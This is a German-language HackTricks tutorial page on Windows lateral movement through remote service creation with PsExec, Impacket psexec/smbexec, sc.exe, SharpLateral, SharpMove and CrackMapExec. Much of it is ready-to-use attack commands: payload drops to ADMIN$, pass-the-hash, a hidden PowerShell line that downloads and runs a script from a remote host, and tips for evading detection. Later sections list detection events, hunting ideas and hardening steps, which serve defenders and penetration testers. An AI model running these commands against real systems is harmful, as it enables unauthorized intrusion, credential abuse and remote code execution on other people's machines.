# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Wie funktionieren sie

Diese Techniken missbrauchen den Windows Service Control Manager (SCM) remote über SMB/RPC, um Befehle auf einem Zielhost auszuführen. Der allgemeine Ablauf ist:

1. Authentifizieren Sie sich am Ziel und greifen Sie auf den ADMIN$-Freigabe über SMB (TCP/445) zu.
2. Kopieren Sie eine ausführbare Datei oder geben Sie eine LOLBAS-Befehlszeile an, die der Dienst ausführen wird.
3. Erstellen Sie einen Dienst remote über SCM (MS-SCMR über \PIPE\svcctl), der auf diesen Befehl oder diese Binärdatei verweist.
4. Starten Sie den Dienst, um die Payload auszuführen und optional stdin/stdout über ein benanntes Pipe zu erfassen.
5. Stoppen Sie den Dienst und bereinigen Sie (löschen Sie den Dienst und alle abgelegten Binärdateien).

Anforderungen/Voraussetzungen:
- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Rechte zur Dienstcreation auf dem Ziel.
- SMB (445) erreichbar und ADMIN$-Freigabe verfügbar; Remote Service Management durch die Host-Firewall erlaubt.
- UAC Remote Restrictions: Bei lokalen Konten kann die Tokenfilterung die Admin-Rechte über das Netzwerk blockieren, es sei denn, es wird der integrierte Administrator oder LocalAccountTokenFilterPolicy=1 verwendet.
- Kerberos vs NTLM: Die Verwendung eines Hostnamens/FQDN ermöglicht Kerberos; die Verbindung über IP fällt oft auf NTLM zurück (und kann in gehärteten Umgebungen blockiert sein).

### Manuelles ScExec/WinExec über sc.exe

Das Folgende zeigt einen minimalen Ansatz zur Dienstcreation. Das Dienstbild kann eine abgelegte EXE oder ein LOLBAS wie cmd.exe oder powershell.exe sein.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notizen:
- Erwarten Sie einen Timeout-Fehler beim Starten einer nicht als Dienst ausgeführten EXE; die Ausführung erfolgt dennoch.
- Um OPSEC-freundlicher zu bleiben, bevorzugen Sie dateilose Befehle (cmd /c, powershell -enc) oder löschen Sie abgelegte Artefakte.

Finden Sie detailliertere Schritte in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Werkzeuge und Beispiele

### Sysinternals PsExec.exe

- Klassisches Administrationswerkzeug, das SMB verwendet, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Dienst (Standardname PSEXESVC) zu installieren und I/O über benannte Pipes zu proxyen.
- Beispielverwendungen:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Sie können direkt von Sysinternals Live über WebDAV starten:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Hinterlässt Ereignisse zur Installation/Deinstallation von Diensten (Der Dienstname ist oft PSEXESVC, es sei denn, -r wird verwendet) und erstellt während der Ausführung C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (PsExec-ähnlich)

- Verwendet einen eingebetteten RemCom-ähnlichen Dienst. Legt eine temporäre Dienst-Binärdatei (häufig mit randomisiertem Namen) über ADMIN$ ab, erstellt einen Dienst (standardmäßig oft RemComSvc) und leitet I/O über ein benanntes Pipe weiter.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefakte
- Temporäre EXE in C:\Windows\ (zufällige 8 Zeichen). Der Dienstname ist standardmäßig RemComSvc, es sei denn, er wird überschrieben.

### Impacket smbexec.py (SMBExec)

- Erstellt einen temporären Dienst, der cmd.exe startet und ein benanntes Pipe für I/O verwendet. Vermeidet im Allgemeinen das Ablegen eines vollständigen EXE-Payloads; die Befehlsausführung ist semi-interaktiv.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral und SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für laterale Bewegung, einschließlich servicebasiertem Exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) umfasst die Modifikation/Erstellung von Diensten, um einen Befehl aus der Ferne auszuführen.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Sie können auch CrackMapExec verwenden, um über verschiedene Backends (psexec/smbexec/wmiexec) auszuführen:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, Erkennung und Artefakte

Typische Host-/Netzwerkartefakte bei der Verwendung von PsExec-ähnlichen Techniken:
- Sicherheit 4624 (Anmeldetyp 3) und 4672 (Besondere Berechtigungen) auf dem Ziel für das verwendete Administratorkonto.
- Sicherheit 5140/5145 Datei-Freigabe- und Datei-Freigabe-Detailevents, die den Zugriff auf ADMIN$ und das Erstellen/Schreiben von Dienstbinaries (z. B. PSEXESVC.exe oder zufällige 8-Zeichen .exe) zeigen.
- Sicherheit 7045 Dienstinstallation auf dem Ziel: Dienstnamen wie PSEXESVC, RemComSvc oder benutzerdefiniert (-r / -service-name).
- Sysmon 1 (Prozess erstellen) für services.exe oder das Dienstbild, 3 (Netzwerkverbindung), 11 (Datei erstellen) in C:\Windows\, 17/18 (Pipe erstellt/verbunden) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_*, oder randomisierte Äquivalente.
- Registrierungsartefakt für Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (wenn nicht unterdrückt).

Jagdmöglichkeiten
- Alarm bei Dienstinstallationen, bei denen der ImagePath cmd.exe /c, powershell.exe oder TEMP-Standorte enthält.
- Suchen nach Prozesskreationen, bei denen ParentImage C:\Windows\PSEXESVC.exe oder Kinder von services.exe, die als LOCAL SYSTEM Shells ausführen, sind.
- Benannte Pipes kennzeichnen, die mit -stdin/-stdout/-stderr enden oder bekannte PsExec-Klon-Pipenamen haben.

## Fehlersuche bei häufigen Fehlern
- Zugriff verweigert (5) beim Erstellen von Diensten: nicht wirklich lokaler Administrator, UAC-Remote-Beschränkungen für lokale Konten oder EDR-Tampering-Schutz auf dem Dienstbinary-Pfad.
- Der Netzwerkpfad wurde nicht gefunden (53) oder konnte nicht zu ADMIN$ verbinden: Firewall blockiert SMB/RPC oder Administrationsfreigaben sind deaktiviert.
- Kerberos schlägt fehl, aber NTLM ist blockiert: Verbindung über Hostname/FQDN (nicht IP) herstellen, sicherstellen, dass die richtigen SPNs vorhanden sind, oder -k/-no-pass mit Tickets bei der Verwendung von Impacket bereitstellen.
- Dienststart läuft ab, aber Payload wurde ausgeführt: zu erwarten, wenn es sich nicht um ein echtes Dienstbinary handelt; Ausgabe in eine Datei erfassen oder smbexec für Live-I/O verwenden.

## Härtungsnotizen
- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB-Signierung für ausgehende (und Windows 11 eingehende) Verbindungen. Dies beeinträchtigt die legitime Verwendung von PsExec mit gültigen Anmeldeinformationen nicht, verhindert jedoch den Missbrauch von unsignierten SMB-Relay und kann Geräte beeinträchtigen, die keine Signierung unterstützen.
- Neue SMB-Client-NTLM-Blockierung (Windows 11 24H2/Server 2025) kann NTLM-Fallback verhindern, wenn über IP oder zu Nicht-Kerberos-Servern verbunden wird. In gehärteten Umgebungen wird dies NTLM-basiertes PsExec/SMBExec brechen; verwenden Sie Kerberos (Hostname/FQDN) oder konfigurieren Sie Ausnahmen, wenn dies legitim erforderlich ist.
- Prinzip der geringsten Privilegien: Minimieren Sie die Mitgliedschaft im lokalen Administrator, bevorzugen Sie Just-in-Time/Just-Enough Admin, erzwingen Sie LAPS und überwachen/benachrichtigen Sie über 7045-Dienstinstallationen.

## Siehe auch

- WMI-basiertes Remote-Exec (oft mehr fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-basiertes Remote-Exec:

{{#ref}}
./winrm.md
{{#endref}}



## Referenzen

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- SMB-Sicherheits-Härtung in Windows Server 2025 & Windows 11 (Standardmäßig signieren, NTLM-Blockierung): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
